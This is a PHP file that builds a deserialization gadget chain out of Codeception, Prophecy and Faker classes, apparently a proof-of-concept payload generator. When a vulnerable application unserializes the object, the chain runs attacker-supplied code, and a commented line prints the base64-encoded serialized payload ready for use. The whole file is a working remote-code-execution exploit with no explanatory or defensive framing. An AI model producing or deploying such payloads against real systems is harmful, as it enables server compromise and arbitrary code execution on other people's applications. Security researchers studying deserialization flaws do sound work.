<?php
/***
 * Created by joker
 * Date 2021/9/7 20:02
 ***/
namespace Codeception\Extension;
use Prophecy\Prophecy\ObjectProphecy;
class RunProcess{
    private $processes;
    function __construct($code)
    {
        $a = new ObjectProphecy('1','1');
        $this->processes[] = new ObjectProphecy($a,$code);
    }
}
// echo base64_encode(serialize(new RunProcess($code)));
namespace Prophecy\Prophecy;
use Prophecy\Doubler\LazyDouble;
class ObjectProphecy{
    private $lazyDouble;
    private $revealer;
    function __construct($a,$code)
    {
        $this->revealer = $a;
        $this->lazyDouble = new LazyDouble($code);
    }
}

namespace Prophecy\Doubler;
class LazyDouble{
    private $doubler;
    private $argument;
    private $class;
    private $interfaces;
    function __construct($code)
    {
        $this->doubler =new Doubler($code);
        $this->class = new \ReflectionClass('Exception');
        $this->argument = array('joker'=>'joker');
        $this->interfaces[] = new \ReflectionClass('Exception');
    }
}
namespace Prophecy\Doubler\Generator\Node;
class ClassNode{
}

namespace Prophecy\Doubler;
use Prophecy\Doubler\Generator\Node\ClassNode;
use Faker\DefaultGenerator;
use Prophecy\Doubler\Generator\ClassCreator;
class Doubler{
    private $mirror;
    private $creator;
    private $namer;
    function __construct($code)
    {
        $this->namer = new DefaultGenerator('joker');
        $this->mirror = new DefaultGenerator(new ClassNode());
        $this->creator = new ClassCreator($code);
    }
}

namespace Faker;
class DefaultGenerator{
protected $default;
    function __construct($default)
    {
        $this->default = $default;
    }
}

namespace Prophecy\Doubler\Generator;
use Faker\DefaultGenerator;
class ClassCreator{
    private $generator;
    function __construct($code)
    {
        $this->generator = new DefaultGenerator($code);
    }
}